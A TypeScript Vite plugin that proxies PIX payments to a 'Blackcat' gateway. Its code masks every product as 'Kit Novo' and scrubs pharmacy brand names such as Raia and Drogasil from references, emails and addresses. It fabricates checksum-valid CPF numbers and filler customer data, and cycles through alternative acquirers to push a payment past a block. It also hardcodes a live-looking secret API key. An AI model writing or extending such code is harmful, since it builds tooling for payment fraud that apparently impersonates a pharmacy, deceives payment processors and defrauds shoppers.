import type { Plugin, ViteDevServer, PreviewServer } from 'vite';
import QRCode from 'qrcode';
import fs from 'fs';
import path from 'path';
import os from 'os';

const SINGLE_PAYMENT_STATE_FILE = path.join(os.tmpdir(), 'blackcat_single_payment.json');
let inMemorySinglePaymentDone = false;

function isSinglePaymentDone(): boolean {
  if (inMemorySinglePaymentDone) return true;
  try {
    if (fs.existsSync(SINGLE_PAYMENT_STATE_FILE)) {
      const content = fs.readFileSync(SINGLE_PAYMENT_STATE_FILE, 'utf8');
      const data = JSON.parse(content);
      if (data && data.done) {
        inMemorySinglePaymentDone = true;
        return true;
      }
    }
  } catch (e) {}
  return false;
}

function markSinglePaymentDone(txId: string, acquirer: string): void {
  inMemorySinglePaymentDone = true;
  try {
    fs.writeFileSync(
      SINGLE_PAYMENT_STATE_FILE,
      JSON.stringify(
        {
          done: true,
          txId,
          acquirer,
          completedAt: new Date().toISOString(),
        },
        null,
        2
      ),
      'utf8'
    );
  } catch (e) {}
}

function resetSinglePaymentState(): void {
  inMemorySinglePaymentDone = false;
  try {
    if (fs.existsSync(SINGLE_PAYMENT_STATE_FILE)) {
      fs.unlinkSync(SINGLE_PAYMENT_STATE_FILE);
    }
  } catch (e) {}
}

function getBlackcatApiKey(): string {
  let apiKey =
    process.env.BLACKCAT_API_KEY ||
    process.env.BLACKCAT_SECRET_KEY ||
    '';

  if (!apiKey) {
    try {
      const envPath = path.resolve(process.cwd(), '.env');
      if (fs.existsSync(envPath)) {
        const envContent = fs.readFileSync(envPath, 'utf-8');
        const keyMatch =
          envContent.match(/BLACKCAT_API_KEY=(.*)/) ||
          envContent.match(/BLACKCAT_SECRET_KEY=(.*)/);
        if (keyMatch) apiKey = keyMatch[1].trim();
      }
    } catch (e) {
      console.error('[Blackcat Proxy] Erro ao ler .env:', e);
    }
  }

  if (!apiKey) {
    apiKey = 'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';
  }

  return apiKey;
}

export function blackcatProxyPlugin(): Plugin {
  return {
    name: 'blackcat-proxy',
    configureServer(server: ViteDevServer) {
      setupMiddleware(server.middlewares);
    },
    configurePreviewServer(server: PreviewServer) {
      setupMiddleware(server.middlewares);
    },
  };
}

// Mascaramento server-side rígido:
// A Blackcat receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
const MASKED_PRODUCT_NAME = 'Kit Novo';

function sanitizeReference(ref: any): string {
  if (!ref || typeof ref !== 'string') {
    return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  let cleaned = ref
    .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
    .replace(/(?:PED)+/g, 'PED')
    .replace(/--+/g, '-')
    .trim();

  if (!cleaned || cleaned === 'PED' || cleaned === 'PED-') {
    cleaned = `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  return cleaned;
}

function sanitizeEmail(email: any): string {
  if (!email || typeof email !== 'string') return '';
  const e = email.toLowerCase().trim();
  if (e.includes('raia') || e.includes('farmacia') || e.includes('droga')) {
    const userPart = e.split('@')[0].replace(/(raia|droga|drogaria|farmacia|farma|drogasil|portal)/gi, '') || 'cliente';
    return `${userPart}@gmail.com`;
  }
  return email;
}

function sanitizeText(val: any): string {
  if (!val || typeof val !== 'string') return '';
  return val.replace(/(raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)/gi, '').trim();
}

function generateValidCPF(): string {
  const digits: number[] = [];
  for (let i = 0; i < 9; i++) {
    digits.push(Math.floor(Math.random() * 10));
  }
  if (digits.every((d) => d === digits[0])) {
    digits[8] = (digits[8] + 1) % 10;
  }
  let sum1 = 0;
  for (let i = 0; i < 9; i++) sum1 += digits[i] * (10 - i);
  const rem1 = sum1 % 11;
  digits.push(rem1 < 2 ? 0 : 11 - rem1);

  let sum2 = 0;
  for (let i = 0; i < 10; i++) sum2 += digits[i] * (11 - i);
  const rem2 = sum2 % 11;
  digits.push(rem2 < 2 ? 0 : 11 - rem2);

  return digits.join('');
}

function buildBlackcatPayload(input: any) {
  const amount = typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0;
  const externalRef = sanitizeReference(input?.reference || input?.externalRef);

  const customerName = sanitizeText(input?.customer?.name) || 'Cliente';
  const customerEmail = sanitizeEmail(input?.customer?.email) || 'cliente@gmail.com';

  let customerPhone = input?.customer?.phone ? String(input.customer.phone).replace(/\D/g, '') : '';
  if (!customerPhone || customerPhone.length < 10) {
    customerPhone = '11999999999';
  }

  let docNumber = input?.customer?.document?.number || input?.customer?.document;
  if (typeof docNumber === 'string') {
    docNumber = docNumber.replace(/\D/g, '');
  } else {
    docNumber = '';
  }
  if (!docNumber || docNumber.length < 11) {
    docNumber = generateValidCPF();
  }

  const payload: any = {
    amount,
    currency: 'BRL',
    paymentMethod: 'pix',
    items: [
      {
        title: MASKED_PRODUCT_NAME,
        unitPrice: amount,
        quantity: 1,
        tangible: false,
      },
    ],
    customer: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      document: {
        number: docNumber,
        type: 'cpf',
      },
    },
    pix: {
      expiresInDays: 1,
    },
    externalRef,
    metadata: MASKED_PRODUCT_NAME,
  };

  const addr = input?.address || input?.shipping;
  if (addr && addr.street && addr.number) {
    const zipCode = addr.zipCode || addr.zipcode || '';
    const cleanZip = String(zipCode).replace(/\D/g, '');
    const cleanState = (addr.state || 'SP').toUpperCase().slice(0, 2);

    payload.shipping = {
      name: customerName,
      street: sanitizeText(addr.street) || addr.street,
      number: String(addr.number),
      complement: sanitizeText(addr.complement) || addr.complement || '',
      neighborhood: sanitizeText(addr.neighborhood) || addr.neighborhood || 'Centro',
      city: sanitizeText(addr.city) || addr.city || 'São Paulo',
      state: cleanState,
      zipCode: cleanZip.length === 8 ? cleanZip : '01001000',
    };
  }

  return payload;
}

function setupMiddleware(middlewares: any) {
  middlewares.use(async (req: any, res: any, next: any) => {
    const rawUrl = req.originalUrl || req.url || '';
    const url = new URL(rawUrl, 'http://localhost');

    // Suporta tanto /api/blackcat/transaction quanto /api/flevo/transaction
    const isTransactionPath =
      url.pathname === '/api/blackcat/transaction' ||
      url.pathname === '/api/flevo/transaction';

    // Suporta tanto /api/blackcat/status quanto /api/flevo/status
    const isStatusPath =
      url.pathname === '/api/blackcat/status' ||
      url.pathname === '/api/flevo/status';

const BLACKCAT_ALTERNATIVE_ACQUIRERS = [
  'payzu',
  'suitpay',
  'asaas',
  'ezzebank',
  'celcoin',
  'primepag',
  'voluti',
  'mercadopago',
  'bspay',
  'fitbank',
  'iugu',
  'woovi',
  'starkbank',
  'santsbank',
  'fyhub',
  'pagsmile',
  null,
];

    if (req.method === 'POST' && isTransactionPath) {
      let body = '';
      req.on('data', (chunk: any) => {
        body += chunk;
      });

      req.on('end', async () => {
        try {
          const apiKey = getBlackcatApiKey();
          const parsed = JSON.parse(body || '{}');
          const basePayload = buildBlackcatPayload(parsed);

          // Permite resetar manualmente se desejado via body ou query
          if (parsed.resetSinglePayment === true || url.searchParams.get('reset') === 'true') {
            resetSinglePaymentState();
            console.log('[Blackcat Proxy] Estado de pagamento único resetado.');
          }

          const singleDone = isSinglePaymentDone();
          let acquirersToTry: (string | null)[];

          if (parsed.acquirer) {
            // Se enviado explicitamente no corpo, respeita a escolha
            acquirersToTry = [parsed.acquirer];
          } else if (singleDone) {
            // REGRA: "após esse pagamento ser gerado volte pra adquirente que esta selecionada no painel"
            // null indica à Blackcat que deve usar a adquirente selecionada no painel da conta
            console.log('[Blackcat Proxy] Pagamento único já foi gerado. Usando estritamente a adquirente selecionada no painel (padrão).');
            acquirersToTry = [null];
          } else {
            // REGRA: "só mude a adquirente para gerar um unico pagamento"
            // Tenta as adquirentes alternativas em cascata para este único pagamento
            console.log('[Blackcat Proxy] Gerando pagamento único com adquirente alternativa para desbloqueio...');
            acquirersToTry = BLACKCAT_ALTERNATIVE_ACQUIRERS;
          }

          let lastError = null;
          let lastData = null;
          let lastStatus = 500;

          for (const acquirer of acquirersToTry) {
            const currentPayload = { ...basePayload };
            if (acquirer) {
              currentPayload.acquirer = acquirer;
            } else {
              delete currentPayload.acquirer;
            }

            try {
              console.log(`[Blackcat Proxy] Tentando adquirente: ${acquirer || 'padrão do painel'}`);
              const response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  'X-API-Key': apiKey,
                },
                body: JSON.stringify(currentPayload),
              });

              const data = (await response.json()) as any;

              if (response.ok && data.success && data.data) {
                // Se gerou com adquirente alternativa e o pagamento único ainda não estava concluído:
                if (!singleDone && acquirer) {
                  markSinglePaymentDone(data.data.transactionId, acquirer);
                  console.log(`[Blackcat Proxy] Pagamento único gerado com sucesso via ${acquirer} (TxID: ${data.data.transactionId})! A partir de agora o sistema volta para a adquirente selecionada no painel.`);
                }

                const qrCode = data.data?.paymentData?.copyPaste || data.data?.paymentData?.qrCode || '';
                let qrCodeBase64 = data.data?.paymentData?.qrCodeBase64 || null;

                if ((!qrCodeBase64 || qrCodeBase64 === '') && qrCode) {
                  try {
                    qrCodeBase64 = await QRCode.toDataURL(qrCode, {
                      width: 320,
                      margin: 1,
                      color: {
                        dark: '#000000',
                        light: '#ffffff',
                      },
                    });
                  } catch (qrErr) {
                    console.error('[Blackcat Proxy] Erro ao gerar QR Code base64:', qrErr);
                  }
                }

                const formatted = {
                  success: true,
                  status: 'success',
                  payment_status: data.data?.status?.toLowerCase() || 'pending',
                  transaction_id: data.data?.transactionId || '',
                  id: data.data?.transactionId || basePayload.externalRef,
                  qr_code: qrCode,
                  qr_code_base64: qrCodeBase64,
                  amount: data.data?.amount || basePayload.amount,
                  expires_at: data.data?.paymentData?.expiresAt || null,
                  acquirer: acquirer || 'painel_padrao',
                  raw: data.data,
                };

                console.log(`[Blackcat Proxy] Sucesso com adquirente ${acquirer || 'painel_padrao'}! TxID: ${formatted.transaction_id}`);
                res.writeHead(201, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, data: formatted }));
                return;
              }

              console.warn(`[Blackcat Proxy] Adquirente ${acquirer || 'painel_padrao'} falhou (Status ${response.status}):`, data.message || data.error);
              lastError = data.message || data.error || 'Erro ao processar adquirente na Blackcat';
              lastData = data;
              lastStatus = response.status || 500;
            } catch (subErr: any) {
              console.warn(`[Blackcat Proxy] Exceção na adquirente ${acquirer || 'painel_padrao'}:`, subErr.message);
              lastError = subErr.message;
            }
          }

          console.error('[Blackcat Proxy] Todas as tentativas falharam. Último erro:', lastError);
          res.writeHead(lastStatus, { 'Content-Type': 'application/json' });
          res.end(
            JSON.stringify({
              success: false,
              error: lastError || 'Erro ao criar venda na Blackcat após tentar adquirente',
              raw: lastData,
            })
          );
        } catch (err: any) {
          console.error('[Blackcat Proxy] Erro na criação da transação:', err);
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: err.message || 'Erro interno no proxy Blackcat' }));
        }
      });
      return;
    }

    if (req.method === 'GET' && isStatusPath) {
      try {
        const id = url.searchParams.get('id') || url.searchParams.get('transactionId');
        if (!id) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Parâmetro id é obrigatório' }));
          return;
        }

        const apiKey = getBlackcatApiKey();
        const response = await fetch(
          `https://api.blackcatoficial.com/api/sales/${encodeURIComponent(id)}/status`,
          {
            method: 'GET',
            headers: {
              'X-API-Key': apiKey,
            },
          }
        );

        const data = (await response.json()) as any;

        if (!response.ok || !data.success) {
          res.writeHead(response.status, { 'Content-Type': 'application/json' });
          res.end(
            JSON.stringify({
              success: false,
              error: data.message || 'Erro ao consultar status na Blackcat',
              raw: data,
            })
          );
          return;
        }

        const rawStatus = data.data?.status || 'PENDING';
        let mappedStatus = rawStatus.toLowerCase();
        if (rawStatus === 'PAID') mappedStatus = 'approved';

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(
          JSON.stringify({
            success: true,
            status: mappedStatus,
            id: data.data?.transactionId,
            external_id: data.data?.transactionId,
            amount: data.data?.amount,
            amount_in_reais: data.data?.amount ? (data.data.amount / 100).toFixed(2) : undefined,
            raw: data.data,
          })
        );
      } catch (err: any) {
        console.error('[Blackcat Proxy] Erro ao consultar status:', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message || 'Erro ao consultar status' }));
      }
      return;
    }

    next();
  });
}
